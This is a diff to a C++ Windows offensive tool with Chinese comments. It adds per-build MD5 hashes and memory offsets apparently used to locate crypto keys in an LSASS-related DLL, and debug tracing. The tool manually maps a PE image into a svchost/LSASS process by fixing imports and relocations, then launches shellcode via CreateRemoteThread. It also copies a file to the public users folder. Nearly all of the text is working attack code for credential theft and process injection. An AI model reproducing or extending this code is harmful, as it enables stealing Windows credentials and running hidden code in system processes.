@@ -12,8 +12,8 @@
 #include <iostream>
 #include <iomanip>
 #include <string>
-
-
+#define jinyongyutiaoshi
+#define defincaoniam 9168
 #define HASH_KEY						13
 #pragma intrinsic( _rotr )
 
@@ -297,13 +297,15 @@ char version_table[TABLE_LENGTH][50] = {
 	"6.1.7601.26561",
 	"10.0.16299.431",
 	"10.0.19041.3324",
-	"10.0.17763.4377"
+	"10.0.17763.4377",
+	"10.0.17763.4377",
+	"10.0.19041.3570"
 };
 char _md5_table[TABLE_LENGTH][33] = {
-	"10.0.19041.1",
+	"e862003aea8c3463f72d7225d1dfbcf0", // 10.0.19041.1
 	"d22e0221ffa5e33b1ef37b104ff55614", // 10.0.19041.2913
 	"6.1.7601.17514",
-	"10.0.22621.1",
+	"bba627660c84ba035bdccadbb97285da",	// 10.0.22621.1
 	"10.0.14393.0",
 	"1ba40d15426fe568e443a52e008db1d7", // 10.0.17763.1
 	"6.1.7601.24214",
@@ -312,7 +314,9 @@ char _md5_table[TABLE_LENGTH][33] = {
 	"6.1.7601.26561",
 	"10.0.16299.431",
 	"f17409ddc9a794eb39cfcd21d2c84c6f", // 10.0.19041.3324
-	"6548b134a3cf304b91490fe916d934b5" // 10.0.17763.4377
+	"6548b134a3cf304b91490fe916d934b5", // 10.0.17763.4377
+	"951a238e964be37f74c32564d2a92319", // 10.0.17763.4377
+	"dd8cacce0209e5f7c4c31720e24178f0" // 10.0.19041.3570
 
 };
 DWORD offset_table[TABLE_LENGTH] = {
@@ -322,6 +326,7 @@ DWORD offset_table[TABLE_LENGTH] = {
 
 DWORD _offset_table[TABLE_LENGTH][5] = {
 	// 目前来看，最后一个偏移量，只有win7系列的是0x18
+	// loonglost\3des\aes\判断决定随便写\0x38或者0x18
 	  {0x32BC3,0x39E5C,0x9E36E,0x108,0x38},
 	  {0x180B3,0x20CEC,0x94568,0x108,0x38}, // 10.0.19041.2913
 	  {0x16150,0x111DE,0x3261B,0xE8,0x18},
@@ -334,7 +339,9 @@ DWORD _offset_table[TABLE_LENGTH][5] = {
 	  {0x10588,0xD8FE,0x4CE0C,0xE8,0x18},
 	  {0x915C,0x3E328,0x3E34D,0xE8,0x38},
 	{0x1FA63,0x395DC,0x8CA6C,0xe8,0x38}, // 10.0.19041.3324
-	{0x37DEC,0x320FC,0x321C8,0xe8,0x38}  // 10.0.17763.4377
+	{0x37DEC,0x320FC,0x321C8,0xe8,0x38} , // 6548b134a3cf304b91490fe916d934b5
+	{0x374DC,0x31E3C,0x31F08,0xe8,0x38},  // 951a238e964be37f74c32564d2a92319
+	{0x39323,0x3016C,0x86FD4,0xe8,0x38} // dd8cacce0209e5f7c4c31720e24178f0
 };
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
@@ -584,14 +591,22 @@ int main(int argc, char** argv)
 		if (FBFileExists(PasdadsaATH2))DeleteFileA(PasdadsaATH2);
 		CopyFileA(PasdadsaATH, PasdadsaATH2, FALSE);
 		printf("file copied to public folder '9at2',please retrieve it\n");
+		// 仅用于调试
+#ifdef jinyongyutiaoshi
+		goto caonimade;
+#endif // jinyongyutiaoshi
+
 		exit(-1);
 	}
 	free(res);
 
 
+caonimade:
 
 
-
+#ifdef jinyongyutiaoshi
+	CopyFileA("C:\\users\\public\\ili6ao - Copy", "C:\\users\\public\\ili6ao", TRUE);
+#endif // jinyongyutiaoshi
 
 	// 将shellcode写入目标进程内存并启动shellcode
 
@@ -599,7 +614,10 @@ int main(int argc, char** argv)
 	DWORD _svchost_1_pid = GetLsvchostsassPid();
 
 	//调试阶段我们使用notepad进程作为注入目标
-	_svchost_1_pid = 12345;
+#ifdef jinyongyutiaoshi
+	//_svchost_1_pid = defincaoniam;
+#endif // jinyongyutiaoshi
+	
 
 // 首先我们要枚举他的module，找到kernel32.dll的base addr
 
@@ -617,9 +635,25 @@ int main(int argc, char** argv)
 
 				// Get the module file name
 				if (GetModuleFileNameExA(target_hProcess, hModuleArray[i], szModuleName, MAX_PATH)) {
+#ifdef jinyongyutiaoshi
+					printf("module name: %s\n", szModuleName);
+#endif // jinyongyutiaoshi
 					// 比较module名称是否为kernel32.dll
-					if (strcmp("kernel32.dll", szModuleName) == 0) {
-						// 记录下base addr
+					char _fuckingstring[13] = "kernel32.dll";
+					//if (strcmp("kernel32.dll", szModuleName) == 0 || strcmp("KERNEL32.DLL", szModuleName) == 0) {
+					//	// 记录下base addr
+					//	_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
+					//	break;
+					//}
+					int flag = 1;
+					for (int j = 0; j < 12; j++) {
+						if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j]-32 != szModuleName[strlen(szModuleName) - 1 - j])) {
+							flag = 0;
+								break;
+
+						}
+					}
+					if (flag) {
 						_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
 						break;
 					}
@@ -732,7 +766,7 @@ int main(int argc, char** argv)
 	// 加载剩余的所有节
 	// uiValueA = the VA of the first section
 	// 获取SizeOfOptionalHeader的size
-	 uiValueA = ((ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader);// uiValueA是section header的地址
+	 uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueA是section header的地址
 	// 遍历所有的节并将它们加载到内存中
 	// itterate through all sections, loading them into memory.
 	ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
@@ -830,8 +864,20 @@ int main(int argc, char** argv)
 				// 通过GetProcAddress获取指定名称的函数地址，并将其放入rvaImportAddressTable中
 				//我们这里依然使用便宜的方式来进行计算
 				// DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
+#ifdef jinyongyutiaoshi
+				printf("function name is: %s\n", ((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
+#endif // jinyongyutiaoshi
 
-				DEREF(uiValueA) = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name)- uiLibraryAddress+_target_process_kernel32_base_addr;
+				DWORD64 _____ashdjoajoidais = (ULONG_PTR)GetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
+
+#ifdef jinyongyutiaoshi
+				printf("this is the function address retrieve from current process's kernel32.dll: %p\n", reinterpret_cast<BYTE*>(_____ashdjoajoidais));
+#endif // jinyongyutiaoshi
+				DWORD64 _tempoppapsdjioasdjhoiasjda= _____ashdjoajoidais - uiLibraryAddress+_target_process_kernel32_base_addr;
+#ifdef jinyongyutiaoshi
+				printf("this is the function address after fixed in target process: %p\n", reinterpret_cast<BYTE*>(_tempoppapsdjioasdjhoiasjda));
+#endif // jinyongyutiaoshi
+				* reinterpret_cast<DWORD64*>(uiValueA) = _tempoppapsdjioasdjhoiasjda;
 			}
 			// get the next imported function
 			uiValueA += sizeof(ULONG_PTR);
@@ -874,6 +920,9 @@ int main(int argc, char** argv)
 		// and we itterate through all entries...
 		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
 		{
+#ifdef jinyongyutiaoshi
+			printf("szie of block in reloc entry: 0x%p\n", reinterpret_cast<BYTE*>(((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock));
+#endif // jinyongyutiaoshi
 			// uiValueA = the VA for this relocation block
 			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);
 
@@ -893,9 +942,19 @@ int main(int argc, char** argv)
 				// IMAGE_REL_BASED_ABSOLUTE只用于padding，所以跳过即可
 				// we dont use a switch statement to avoid the compiler building a jump table
 				// which would not be very position independent!
-				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64)
+				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {
+
+#ifdef jinyongyutiaoshi
+					printf("base reloc offset: 0x%p\n", reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));
+					printf("after add to reloc block base: 0x%p\n", reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));
+					printf("here is the value in it, DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+#endif // jinyongyutiaoshi
 					// 把这个地方的值取出来，加上delta再放回去即可
 					*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
+#ifdef jinyongyutiaoshi
+					printf("here is the value after fixed up , DWORD64: 0x%p\n", reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+#endif // jinyongyutiaoshi
+				}
 				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
 					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
 
@@ -984,6 +1043,7 @@ int main(int argc, char** argv)
 		CloseHandle(hw);
 		return -1;
 	}*/
+		MessageBoxA(NULL,"OK","OK",MB_OK);
 	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
 	if (!thread)
 	{
